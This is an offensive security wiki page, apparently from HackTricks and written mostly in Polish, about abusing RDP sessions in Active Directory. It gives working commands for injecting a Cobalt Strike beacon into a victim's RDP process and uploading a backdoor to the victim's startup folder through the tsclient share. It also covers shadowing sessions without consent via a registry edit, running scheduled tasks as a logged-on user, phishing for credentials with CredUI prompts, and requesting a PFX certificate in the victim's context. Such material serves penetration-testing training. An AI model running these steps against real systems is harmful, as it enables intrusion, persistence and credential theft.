# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Jeśli **grupa zewnętrzna** ma **RDP access** do dowolnego **komputera** w bieżącej domenie, **attacker** mógłby **compromise that computer and wait for him**.

Gdy użytkownik połączy się przez RDP, **attacker can pivot to that users session** i nadużyć jej uprawnień w domenie zewnętrznej.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Sprawdź **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Jeśli użytkownik uzyska dostęp przez **RDP into a machine**, gdzie **attacker** **waiting** na niego, **attacker** będzie w stanie **inject a beacon in the RDP session of the user**, a jeśli **victim mounted his drive** podczas łączenia przez RDP, **attacker could access it**.

W takim przypadku możesz po prostu **compromise** **victims** **original computer**, zapisując **backdoor** w **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Jeśli jesteś **local admin** na hoście, gdzie ofiara ma już **active RDP session**, możesz być w stanie **view/control that desktop without stealing the password or dumping LSASS**.

To zależy od polityki **Remote Desktop Services shadowing** przechowywanej w:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interesujące wartości:

- `0`: Wyłączone
- `1`: `EnableInputNotify` (kontrola, wymagana zgoda użytkownika)
- `2`: `EnableInputNoNotify` (kontrola, **bez zgody użytkownika**)
- `3`: `EnableNoInputNotify` (tylko podgląd, wymagana zgoda użytkownika)
- `4`: `EnableNoInputNoNotify` (tylko podgląd, **bez zgody użytkownika**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Jest to szczególnie przydatne, gdy uprzywilejowany użytkownik połączony przez RDP zostawił odblokowany pulpit, sesję KeePass, konsolę MMC, sesję przeglądarki lub otwarty admin shell.

## Scheduled Tasks As Logged-On User

If you are **local admin** and the target user is **currently logged on**, Task Scheduler can start code **as that user without their password**.

To zmienia istniejącą sesję logowania ofiary w prymityw wykonawczy:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Uwagi:

- Jeśli użytkownik **nie jest zalogowany**, Windows zwykle wymaga hasła, aby utworzyć zadanie uruchamiane jako ten użytkownik.
- Jeśli użytkownik **jest zalogowany**, zadanie może ponownie użyć istniejącego kontekstu logowania.
- To praktyczny sposób na wykonanie akcji GUI lub uruchomienie binarek w sesji ofiary bez dotykania LSASS.

## CredUI Prompt Abuse From the Victim Session

Gdy możesz wykonać kod **wewnątrz interaktywnego pulpitu ofiary** (na przykład przez **Shadow RDP** lub **zadanie zaplanowane uruchamiane jako ten użytkownik**), możesz wyświetlić **prawdziwy monit poświadczeń Windows** używając API CredUI i zebrać poświadczenia wpisane przez ofiarę.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typowy przebieg:

1. Uruchom binarkę w sesji ofiary.
2. Wyświetl monit uwierzytelniania domenowego, który pasuje do aktualnego brandingu domeny.
3. Rozpakuj zwrócony bufor uwierzytelniania.
4. Zwaliduj podane poświadczenia i opcjonalnie kontynuuj wyświetlanie monitów aż do podania poprawnych poświadczeń.

To przydatne dla **on-host phishing**, ponieważ monit jest renderowany przez standardowe Windows APIs zamiast fałszywego formularza HTML.

## Requesting a PFX In the Victim Context

Ta sama prymitywna metoda **scheduled-task-as-user** może być użyta do zażądania **certificate/PFX jako zalogowany użytkownik**. Ten certyfikat można później użyć do **AD authentication** jako ten użytkownik, unikając całkowicie kradzieży haseł.

Ogólny przebieg:

1. Zyskaj **local admin** na hoście, na którym ofiara jest zalogowana.
2. Uruchom logikę rejestracji/eksportu jako ofiara używając **scheduled task**.
3. Eksportuj otrzymany **PFX**.
4. Użyj PFX do PKINIT / uwierzytelniania w AD na podstawie certyfikatu.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Źródła

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
